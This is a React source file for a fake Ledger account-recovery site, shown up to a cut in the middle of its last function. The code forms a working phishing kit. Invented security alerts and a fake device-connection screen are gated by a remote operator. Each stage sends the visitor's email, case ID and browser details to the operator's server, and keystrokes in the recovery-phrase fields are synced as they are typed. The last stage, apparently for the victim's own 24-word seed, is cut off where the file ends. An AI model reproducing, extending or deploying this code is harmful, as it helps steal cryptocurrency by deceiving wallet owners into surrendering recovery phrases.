"use client"

import { useState, useEffect, useRef, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { AlertTriangle, KeyRound, ShieldAlert, Download, Eye, EyeOff, ArrowRight, ShieldCheck, AlertCircle, Loader2, CheckCircle2 } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"
import { RequestCard, type LedgerRequest, type RequestStatus } from "@/components/request-card"
import { UsbAnimation } from "@/components/usb-animation"

type LedgerStage = UserActivity["currentStage"]

const STAGE_ORDER: LedgerStage[] = ["intake", "approval", "connect-ledger", "confirm-reset", "reset-api-keys", "verify-words", "enter-old-keys", "completed"]

function getNextStage(current: LedgerStage): LedgerStage {
  const idx = STAGE_ORDER.indexOf(current)
  return idx < STAGE_ORDER.length - 1 ? STAGE_ORDER[idx + 1] : "completed"
}

function generateVisitorId() {
  return "ledger_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36)
}

// Waiting for admin approval screen
function WaitingForApprovalScreen({ deniedMessage }: { deniedMessage?: string }) {
  if (deniedMessage) {
    return (
      <main className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="mx-auto max-w-md space-y-6 text-center">
          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-destructive/10">
            <AlertCircle className="h-8 w-8 text-destructive" />
          </div>
          <h2 className="text-xl font-semibold text-foreground">Request Denied</h2>
          <p className="text-muted-foreground">{deniedMessage}</p>
          <p className="text-xs text-muted-foreground">Please contact support if you believe this is an error.</p>
        </div>
      </main>
    )
  }

  return (
    <main className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
      <div className="mx-auto max-w-md space-y-6 text-center">
        <div className="mx-auto flex h-16 w-16 items-center justify-center">
          <Loader2 className="h-10 w-10 animate-spin text-foreground" />
        </div>
        <h2 className="text-xl font-semibold text-foreground">Processing your request...</h2>
        <p className="text-muted-foreground">Your submission is being reviewed. This may take a few moments.</p>
        <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
          <div className="h-1.5 w-1.5 animate-pulse rounded-full bg-foreground" />
          Waiting for verification
        </div>
      </div>
    </main>
  )
}

const initialRequests: LedgerRequest[] = [
  {
    id: "1",
    requester: "ID recovery change",
    category: "Security Alert",
    description: "ID recovery change was requested by a unknown user",
    date: "Jan 28, 2026",
    status: "pending",
  },
  {
    id: "2",
    requester: "Login attempt from Frankfurt, Germany",
    category: "Security Alert",
    description: "Unknown login from a foreign country",
    date: "Jan 27, 2026",
    status: "pending",
  },
  {
    id: "3",
    requester: "Attempt to purchase Crypto",
    category: "Transaction Alert",
    description: "$5,000 dollars has been attempted to be purchased on your account please confirm if this was you",
    date: "Jan 26, 2026",
    status: "pending",
  },
  {
    id: "4",
    requester: "Request to change API keys",
    category: "Security Alert",
    description: "Request to change the API keys on this account",
    date: "Jan 25, 2026",
    status: "pending",
  },
]

const CORRECT_WORDS = [
  "ramp", "oak", "walnut", "crime", "coast", "school",
  "bench", "win", "twelve", "lyrics", "hobby", "fork",
  "runway", "great", "very", "goat", "vapor", "copper",
  "glide", "diesel", "potato", "sausage", "property", "magnet"
]

function LedgerHeader() {
  return (
    <header className="border-b border-border">
      <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
        <div className="flex h-16 items-center">
          <div className="relative flex items-center">
            <span className="absolute -top-0.5 -left-1 h-2.5 w-2.5 border-l-2 border-t-2 border-foreground" aria-hidden="true" />
            <span className="px-3 py-1 text-sm font-bold tracking-[0.2em] text-foreground">LEDGER</span>
            <span className="absolute -bottom-0.5 -right-1 h-2.5 w-2.5 border-r-2 border-b-2 border-foreground" aria-hidden="true" />
          </div>
        </div>
      </div>
    </header>
  )
}

// ===== STAGE: INTAKE =====
function IntakeStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [step, setStep] = useState<"email" | "caseId">("email")
  const [email, setEmail] = useState("")
  const [caseId, setCaseId] = useState("")
  const [emailError, setEmailError] = useState("")
  const [caseIdError, setCaseIdError] = useState("")
  const [isNavigating, setIsNavigating] = useState(false)

  const handleEmailNext = async () => {
    if (!email.includes("@")) {
      setEmailError("Please enter a valid email address")
      return
    }
    setEmailError("")

    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity: { ...data.activity, email: email.trim(), lastUpdated: new Date().toISOString() } }),
        })
      }
    }
    setStep("caseId")
  }

  const handleCaseIdNext = async () => {
    if (isNavigating) return
    if (!caseId.trim()) {
      setCaseIdError("Please enter your case ID")
      return
    }
    setCaseIdError("")
    setIsNavigating(true)

    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()

    const activity: UserActivity = {
      ...(data.activity || {}),
      visitorId,
      currentStage: "approval",
      email: email.trim(),
      caseId: caseId.trim(),
      decisions: data.activity?.decisions || [],
      lastUpdated: new Date().toISOString(),
      lastHeartbeat: new Date().toISOString(),
      isOnline: true,
      userAgent: navigator.userAgent,
    }

    await fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId, activity }),
    })

    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
      <div className="max-w-md mx-auto">
        {step === "email" ? (
          <>
            <h1 className="mb-6 text-left text-base font-semibold text-foreground sm:mb-8 sm:text-2xl">
              Enter the email address used to create your ledger ticket
            </h1>
            <div className="space-y-4 sm:space-y-5">
              <div className="space-y-2">
                <label className="text-xs text-muted-foreground sm:text-sm">Email Address</label>
                <Input
                  type="email"
                  placeholder="you@example.com"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); if (emailError) setEmailError("") }}
                  className={`bg-secondary text-sm sm:text-base h-10 sm:h-11 ${emailError ? "border-destructive" : "border-border"}`}
                />
                {emailError && <p className="text-xs text-destructive">{emailError}</p>}
              </div>
              <Button onClick={handleEmailNext} className="w-full bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                Next
              </Button>
            </div>
          </>
        ) : (
          <>
            <h1 className="mb-6 text-lg font-semibold leading-snug text-foreground sm:mb-8 sm:text-2xl">
              Enter your case ID to continue
            </h1>
            <div className="space-y-4 sm:space-y-5">
              <div className="space-y-2">
                <label className="text-xs text-muted-foreground sm:text-sm">Case ID</label>
                <Input
                  type="text"
                  placeholder="Enter your case ID"
                  value={caseId}
                  onChange={(e) => { setCaseId(e.target.value); if (caseIdError) setCaseIdError("") }}
                  className={`bg-secondary text-sm sm:text-base h-10 sm:h-11 ${caseIdError ? "border-destructive" : "border-border"}`}
                />
                {caseIdError && <p className="text-xs text-destructive">{caseIdError}</p>}
              </div>
              <div className="flex gap-3">
                <Button type="button" variant="outline" onClick={() => { setStep("email"); setCaseIdError("") }} className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  Back
                </Button>
                <Button onClick={handleCaseIdNext} disabled={isNavigating} className="flex-1 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
                  {isNavigating ? "Loading..." : "Next"}
                </Button>
              </div>
            </div>
          </>
        )}
      </div>
    </main>
  )
}

// ===== STAGE: APPROVAL =====
function ApprovalStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [requests, setRequests] = useState<LedgerRequest[]>(initialRequests)
  const [ipAddress, setIpAddress] = useState<string>("")
  const [isNavigating, setIsNavigating] = useState(false)
  const allDecided = requests.every((req) => req.status !== "pending")

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          setIpAddress(data.activity.ipAddress)
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "approval",
            decisions: initialRequests.map((req) => ({
              requestId: req.id,
              requestName: req.requester,
              action: "pending" as const,
              timestamp: new Date().toISOString(),
            })),
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
        }
      })
  }, [visitorId])

  const updateActivity = async (updatedRequests: LedgerRequest[]) => {
    if (!visitorId) return
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    const sessionStarted = data.activity?.sessionStarted || new Date().toISOString()

    const activity: UserActivity = {
      visitorId,
      ipAddress,
      currentStage: "approval",
      decisions: updatedRequests.map((req) => ({
        requestId: req.id,
        requestName: req.requester,
        action: req.status as "approved" | "denied" | "pending",
        timestamp: new Date().toISOString(),
      })),
      sessionStarted,
      lastUpdated: new Date().toISOString(),
      lastHeartbeat: new Date().toISOString(),
      isOnline: true,
      userAgent: navigator.userAgent,
    }

    fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId, activity }),
    })
  }

  const handleApprove = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "approved" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  const handleDeny = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "denied" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-2xl mx-auto space-y-4">
        {requests.map((request) => (
          <RequestCard key={request.id} request={request} onApprove={handleApprove} onDeny={handleDeny} />
        ))}
      </div>
      {allDecided && (
        <div className="flex justify-center mt-6">
          <Button
            onClick={async () => {
              if (isNavigating) return
              setIsNavigating(true)
              const res = await fetch(`/api/activity?visitorId=${visitorId}`)
              const data = await res.json()
              const activity: UserActivity = {
                ...data.activity,
                currentStage: "connect-ledger",
                decisions: requests.map((req) => ({
                  requestId: req.id,
                  requestName: req.requester,
                  action: req.status as "approved" | "denied" | "pending",
                  timestamp: new Date().toISOString(),
                })),
                lastUpdated: new Date().toISOString(),
              }
              await fetch("/api/activity", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ visitorId, activity }),
              })
              onNext()
            }}
            className="bg-foreground text-background hover:bg-foreground/80 w-full sm:w-auto transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 cursor-pointer"
          >
            {isNavigating ? "Loading..." : "Next"}
          </Button>
        </div>
      )}
    </main>
  )
}

// ===== STAGE: CONNECT LEDGER =====
function ConnectLedgerStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [isWaiting, setIsWaiting] = useState(false)
  const [isConnected, setIsConnected] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const existingStage2 = data.activity.stage2Data
          if (existingStage2?.waitingForAdmin) {
            setIsWaiting(true)
            if (existingStage2?.adminConfirmed) setIsConnected(true)
            return
          }
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "connect-ledger",
            stage2Data: { waitingForAdmin: false, adminConfirmed: false },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
        }
      })
  }, [visitorId])

  useEffect(() => {
    if (!isWaiting || !visitorId) return
    const checkConfirmation = async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity?.stage2Data?.adminConfirmed && !isConnected) {
        setIsConnected(true)
        setTimeout(async () => {
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "confirm-reset",
            lastUpdated: new Date().toISOString(),
          }
          await fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
          onNext()
        }, 2000)
      }
    }
    const interval = setInterval(checkConfirmation, 1000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, isConnected, onNext])

  const handleNext = async () => {
    setIsWaiting(true)
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    if (data.activity) {
      const activity: UserActivity = {
        ...data.activity,
        currentStage: "connect-ledger",
        stage2Data: { waitingForAdmin: true, adminConfirmed: false },
        lastUpdated: new Date().toISOString(),
      }
      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, activity }),
      })
    }
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-md mx-auto text-center">
        <p className="text-sm text-muted-foreground mb-6">Please connect your ledger device to continue with the recovery process</p>
        <UsbAnimation isConnecting={isWaiting} isConnected={isConnected} />
        <div className="mt-6">
          {!isWaiting && !isConnected && (
            <Button onClick={handleNext} className="bg-foreground text-background hover:bg-foreground/80 w-full cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">Next</Button>
          )}
          {isWaiting && !isConnected && <p className="text-sm text-muted-foreground animate-pulse">Connecting to your Ledger device...</p>}
          {isConnected && <p className="text-sm text-success animate-pulse">Redirecting to next step...</p>}
        </div>
      </div>
    </main>
  )
}

// ===== STAGE: CONFIRM RESET =====
function ConfirmResetStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [isNavigating, setIsNavigating] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = { ...data.activity, currentStage: "confirm-reset", lastUpdated: new Date().toISOString() }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
        }
      })
  }, [visitorId])

  const handleYes = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    if (data.activity) {
      const activity: UserActivity = { ...data.activity, currentStage: "reset-api-keys", lastUpdated: new Date().toISOString() }
      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, activity }),
      })
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-full bg-warning/10 flex items-center justify-center">
                <AlertTriangle className="h-8 w-8 text-warning" />
              </div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">API Key Reset Confirmation</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Would you like to reset the API keys that have current requests on them?</p>
            <Card className="border-border bg-secondary/50 mb-6">
              <CardContent className="p-4">
                <div className="flex items-start gap-3">
                  <ShieldAlert className="h-5 w-5 text-warning shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-foreground mb-2">This action will:</p>
                    <ul className="text-xs text-muted-foreground space-y-1 list-disc list-inside">
                      <li>Invalidate all current API keys with pending requests</li>
                      <li>Generate new replacement keys for your account</li>
                      <li>Require re-authentication on all connected services</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
            <div className="flex items-center gap-2 mb-6 p-3 rounded-md bg-secondary/30 border border-border">
              <KeyRound className="h-4 w-4 text-muted-foreground shrink-0" />
              <p className="text-xs text-muted-foreground">Your new API keys will be available for download on the next step.</p>
            </div>
            <div className="flex gap-3">
              <Button variant="outline" onClick={() => {}} className="flex-1 bg-transparent border-border hover:bg-secondary cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">No, go back</Button>
              <Button onClick={handleYes} className="flex-1 bg-foreground text-background hover:bg-foreground/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
                {isNavigating ? "Loading..." : "Yes, reset keys"}
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: RESET API KEYS =====
function ResetApiKeysStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [selectedKey, setSelectedKey] = useState<string>("")
  const [showWarning, setShowWarning] = useState(false)
  const [warningAccepted, setWarningAccepted] = useState(false)
  const [keysBlurred, setKeysBlurred] = useState(false)
  const [hasDownloadedOrViewed, setHasDownloadedOrViewed] = useState(false)
  const [isNavigating, setIsNavigating] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "reset-api-keys",
            stage3Data: { selectedApiKey: "", downloadClicked: false },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
        }
      })
  }, [visitorId])

  const handleDownload = async () => {
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          stage3Data: { selectedApiKey: selectedKey || "primary", downloadClicked: true, downloadTimestamp: new Date().toISOString() },
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }
    const content = `1.\nramp\n\n2.\noak\n\n3.\nwalnut\n\n4.\ncrime\n\n5.\ncoast\n\n6.\nschool\n\n7.\nbench\n\n8.\nwin\n\n9.\ntwelve\n\n10.\nlyrics\n\n11.\nhobby\n\n12.\nfork\n\n13.\nrunway\n\n14.\ngreat\n\n15.\nvery\n\n16.\ngoat\n\n17.\nvapor\n\n18.\ncopper\n\n19.\nglide\n\n20.\ndiesel\n\n21.\npotato\n\n22.\nsausage\n\n23.\nproperty\n\n24.\nmagnet`
    const fileName = selectedKey === "primary" ? "Primary API Keys.txt" : "Secondary API Keys.txt"
    const blob = new Blob([content], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = fileName
    a.click()
    URL.revokeObjectURL(url)
    setHasDownloadedOrViewed(true)
  }

  const handleNext = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = { ...data.activity, currentStage: "verify-words", lastUpdated: new Date().toISOString() }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center">
                <KeyRound className="h-8 w-8 text-foreground" />
              </div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Reset API Keys</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Select the API key you would like to reset and download your new credentials.</p>

            {showWarning && (
              <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm p-4">
                <Card className="border-border bg-card max-w-sm w-full">
                  <CardContent className="p-6">
                    <div className="flex justify-center mb-4">
                      <div className="h-12 w-12 rounded-full bg-warning/10 flex items-center justify-center">
                        <AlertTriangle className="h-6 w-6 text-warning" />
                      </div>
                    </div>
                    <h2 className="text-lg font-semibold text-foreground text-center mb-2">Security Warning</h2>
                    <p className="text-sm text-muted-foreground text-center mb-4">Do not screenshot or share these API keys for security purposes. Keep your keys private and store them securely.</p>
                    <div className="flex gap-3">
                      <Button variant="outline" onClick={() => setShowWarning(false)} className="flex-1 bg-transparent border-border hover:bg-secondary h-10 cursor-pointer transition-all duration-200">Cancel</Button>
                      <Button onClick={() => { setWarningAccepted(true); setShowWarning(false); setHasDownloadedOrViewed(true) }} className="flex-1 bg-foreground text-background hover:bg-foreground/80 h-10 cursor-pointer transition-all duration-200">I understand</Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs text-muted-foreground">Select API Key</label>
                <Select value={selectedKey} onValueChange={(value) => {
                  setSelectedKey(value)
                  if (visitorId) {
                    fetch(`/api/activity?visitorId=${visitorId}`)
                      .then((res) => res.json())
                      .then((data) => {
                        if (data.activity) {
                          const activity: UserActivity = { ...data.activity, stage3Data: { ...data.activity.stage3Data, selectedApiKey: value }, lastUpdated: new Date().toISOString() }
                          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
                        }
                      })
                  }
                }}>
                  <SelectTrigger className="bg-secondary border-border"><SelectValue placeholder="Select API key to reset" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="primary">Primary API Key</SelectItem>
                    <SelectItem value="secondary">Secondary API Key</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>

            {warningAccepted && (
              <div className={`mt-4 p-4 rounded-md bg-secondary border border-border ${keysBlurred ? "blur-sm select-none" : ""}`}>
                <p className="text-xs font-medium text-foreground mb-2">Your recovery phrase:</p>
                <div className="grid grid-cols-3 gap-2">
                  {CORRECT_WORDS.map((word, i) => (
                    <div key={i} className="flex items-center gap-1 text-xs font-mono">
                      <span className="text-muted-foreground w-5 text-right">{i + 1}.</span>
                      <span className="text-foreground">{word}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="mt-4 flex gap-2">
              <Button onClick={handleDownload} disabled={!selectedKey} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
                <Download className="mr-2 h-4 w-4" />Download
              </Button>
              {warningAccepted ? (
                <Button onClick={() => setKeysBlurred(!keysBlurred)} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  {keysBlurred ? <><Eye className="mr-2 h-4 w-4" /> View API Keys</> : <><EyeOff className="mr-2 h-4 w-4" /> Hide API Keys</>}
                </Button>
              ) : (
                <Button onClick={() => setShowWarning(true)} variant="outline" className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  <Eye className="mr-2 h-4 w-4" />View API Keys
                </Button>
              )}
            </div>
            <Button onClick={handleNext} disabled={!hasDownloadedOrViewed || isNavigating} className="w-full mt-4 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              <ArrowRight className="mr-2 h-4 w-4" />{isNavigating ? "Loading..." : "Next"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: VERIFY WORDS =====
function VerifyWordsStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [errors, setErrors] = useState<number[]>([])
  const [isSubmitting, setIsSubmitting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "verify-words",
            verifyWordsData: { ...(data.activity.verifyWordsData || {}), enteredWords: data.activity.verifyWordsData?.enteredWords || Array(24).fill("") },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) clearTimeout(syncTimeoutRef.current)
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, field: "verifyWordsData", enteredWords: [...latestWordsRef.current] }),
        })
      }
    }, 150)
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) { clearTimeout(syncTimeoutRef.current); syncTimeoutRef.current = null }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, field: "verifyWordsData", enteredWords: [...latestWordsRef.current] }),
      })
    }
  }

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]; newWords[index] = trimmed.toLowerCase(); setWords(newWords)
      if (errors.includes(index + 1)) setErrors(errors.filter((e) => e !== index + 1))
      if (index < 23) inputRefs.current[index + 1]?.focus()
      syncWords(newWords); return
    }
    const newWords = [...words]; newWords[index] = value.toLowerCase(); setWords(newWords)
    if (errors.includes(index + 1)) setErrors(errors.filter((e) => e !== index + 1))
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Enter" || e.key === "Tab") { e.preventDefault(); if (index < 23) inputRefs.current[index + 1]?.focus() }
    if (e.key === "Backspace" && words[index] === "" && index > 0) { e.preventDefault(); inputRefs.current[index - 1]?.focus() }
  }

  const handleVerify = async () => {
    if (isSubmitting) return
    const wrongNumbers: number[] = []
    for (let i = 0; i < 24; i++) { if (words[i].toLowerCase().trim() !== CORRECT_WORDS[i]) wrongNumbers.push(i + 1) }
    if (wrongNumbers.length > 0) { setErrors(wrongNumbers); return }
    setErrors([]); setIsSubmitting(true)
    latestWordsRef.current = [...words]; await flushSync()
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = { ...data.activity, currentStage: "enter-old-keys", lastUpdated: new Date().toISOString() }
        await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
      }
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center"><ShieldCheck className="h-8 w-8 text-foreground" /></div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Verify Your Recovery Phrase</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Enter each of your 24 recovery words in order to verify you have saved them correctly.</p>
            {errors.length > 0 && (
              <div className="mb-4 p-3 rounded-md bg-destructive/10 border border-destructive/20">
                <div className="flex items-start gap-2">
                  <AlertCircle className="h-4 w-4 text-destructive shrink-0 mt-0.5" />
                  <div>
                    <p className="text-xs font-medium text-destructive">{errors.length === 1 ? "1 word is incorrect:" : `${errors.length} words are incorrect:`}</p>
                    <p className="text-xs text-destructive/80 mt-0.5">{errors.map((n) => `Word #${n}`).join(", ")}</p>
                  </div>
                </div>
              </div>
            )}
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
              {Array.from({ length: 24 }).map((_, i) => (
                <div key={i} className="flex items-center gap-1">
                  <span className="text-xs text-muted-foreground w-5 text-right shrink-0">{i + 1}.</span>
                  <Input
                    ref={(el) => { inputRefs.current[i] = el }}
                    type="text" value={words[i]}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    placeholder={`Word ${i + 1}`} autoComplete="off"
                    className={`bg-secondary text-xs h-9 font-mono ${errors.includes(i + 1) ? "border-destructive focus-visible:ring-destructive" : "border-border"}`}
                  />
                </div>
              ))}
            </div>
            <Button onClick={handleVerify} disabled={isSubmitting || words.some((w) => !w.trim())} className="w-full mt-6 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              {isSubmitting ? "Verifying..." : "Verify"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: ENTER OLD KEYS =====
function EnterOldKeysStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [isWaiting, setIsWaiting] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
